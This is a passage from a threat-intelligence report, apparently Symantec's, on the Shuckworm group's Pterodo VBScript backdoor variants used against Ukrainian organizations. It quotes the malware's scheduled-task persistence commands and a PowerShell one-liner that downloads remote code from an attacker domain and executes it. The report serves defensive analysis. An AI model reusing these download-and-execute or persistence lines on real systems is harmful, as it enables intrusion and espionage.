These attacks have continued unabated since the Russian invasion of the country.\nWhile the group’s tools and tactics are simple and sometimes crude, the frequency and\npersistence of its attacks mean that it remains one of the key cyber threats facing\norganizations in the region.\n\n## Multiple payloads\n\nOne of the hallmarks of the group’s recent activity is the deployment of multiple malware\npayloads on targeted computers. These payloads are usually different variants of the same\nmalware (Backdoor.Pterodo), designed to perform similar tasks. Each will communicate with\na different command-and-control (C&C) server.\n\nThe most likely reason for using multiple variants is that it may provide a rudimentary way of\nmaintaining persistence on an infected computer. If one payload or C&C server is detected\nand blocked, the attackers can fall back on one of the others and roll out more new variants\nto compensate.\n\n\n-----\n\nSymantec s Threat Hunter Team, part of [Broadcom Software, has found four distinct variants](https://software.broadcom.com/)\nof Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers\nwith similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to\nmaintain persistence, and download additional code from a C&C server. All of the embedded\nVBScripts were very similar to one another and used similar obfuscation techniques.\n\n## Backdoor.Pterodo.B\n\nThis variant is a modified self-extracting archive, containing obfuscated VBScripts in\nresources that can be unpacked by 7-Zip.\n\nIt then adds them as a scheduled task to ensure persistence:\n\nCreateObject(\"Shell.Application\").ShellExecute \"SCHTASKS\", \"/CREATE /sc minute\n/mo 10 /tn \" + \"\"\"UDPSync\"\" /tr \"\"wscript.exe \"\"\" + hailJPT + \"\"\"\" & \" jewels //b joking\n//e VBScript joyful \"\" /F \", \"\", \"\", 0\nCreateObject(\"Shell.Application\").ShellExecute \"SCHTASKS\", \"/CREATE /sc minute\n/mo 10 /tn \" + \"\"\"SyncPlayer\"\" /tr \"\"wscript.exe \"\"\" + enormouslyAKeIXNE + \"\"\"\" + \"\njewels //b joking //e VBScript joyful \"\" /F \", \"\", \"\", 0\n\nThe script also copies itself to [USERPROFILE]\\ntusers.ini file.\n\nThe two newly created files are more obfuscated VBScripts.\n\nThe first is designed to gather system information, such as the serial number of the C:\ndrive, and sends this information to a C&C server.\nThe second adds another layer of persistence by copying the previously dropped\nntusers.ini file to another desktop.ini file.\n\n## Backdoor.Pterodo.C\n\nThis variant is also designed to drop VBScripts on the infected computer. When run, it will\nfirst engage in API hammering, making multiple meaningless API calls, which is presumably\nan attempt to avoid sandbox detection. It will then unpack a script and a file called\noffspring.gif to C:\\Users\\[username]\\. It will call the script with:\n\n\"wscript \"[USERNAME]\\lubszfpsqcrblebyb.tbi\" //e:VBScript /w /ylq /ib /bxk //b /pgs\"\n\nThis script runs ipconfig /flushdns and executes the offspring.gif file. Offsprint.gif will\ndownload a PowerShell script from a random subdomain of corolain.ru and execute it:\n\ncvjABuNZjtPirKYVchnpGVop = \"$tmp = $(New-Object\nnet.webclient).DownloadString('http://'+\n\n[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru')\n+'/get.php'); Invoke-Expression $tmp\"\n\n\n-----\n\n## Backdoor.Pterodo.D\n\nThis variant is another VBScript dropper. It will create two files:\n\n[USERPROFILE]\\atwuzxsjiobk.ql\n\n[USERPROFILE]\\abide.wav\n\nIt executes them with the following command:\n\nwscript \"[USERPROFILE]\\atwuzxsjiobk.ql\" //e:VBScript /tfj /vy /g /cjr /rxia //b /pyvc\n\nSimilar to the other variants, the first script will run ipconfig /flushdns before calling the\nsecond script and removing the original executable.\n\nThe second script has two layers of obfuscation, but in the end it downloads the final payload\nfrom the domain declined.delivered.maizuko[.]ru and executes it.\n\n## Backdoor.Pterodo.E\n\nThe final variant is functionally very similar to variants B and C, engaging in API hammering\nbefore extracting two VBScript files to the user’s home directory. Script obfuscation is very\nsimilar to other variants.\n\n## Other tools\n\nWhile the attackers have made heavy use of Pterodo during recent weeks, other tools have\nalso been deployed alongside it. These include UltraVNC, an open-source remoteadministration/remote-desktop-software utility. UltraVNC has previously been used by\nShuckworm in multiple attacks.\n\nIn addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft\nSysinternals tool designed to provide information about which handles and DLL processes\nhave opened or loaded.\n\n## Persistent threat\n\nWhile Shuckworm is not the most tactically sophisticated espionage group, it compensates\nfor this in its focus and persistence in relentlessly targeting Ukrainian organizations. It\nappears that Pterodo is being continuously redeveloped by the attackers in a bid to stay\nahead of detection.\n\nWhile Shuckworm appears to be largely focused on intelligence gathering, its attacks could\nalso potentially be a precursor to more serious intrusions, if the access it acquires to\nUkrainian organizations is turned over to other Russian-sponsored actors.\n\n\n-----\n\n## Protection/Mitigation\n\n[For the latest protection updates, please visit the Symantec Protection Bulletin.](https://www.broadcom.com/support/security-center/protection-bulletin)\n\n## Indicators of Compromise\n\nA full list of IOCs is [available here on GitHub.](https://github.com/Symantec/threathunters/tree/main/Shuckworm)\n\nIf an IOC is malicious and the file available to us, Symantec Endpoint products will detect\nand block that file.\n\n\n-----",
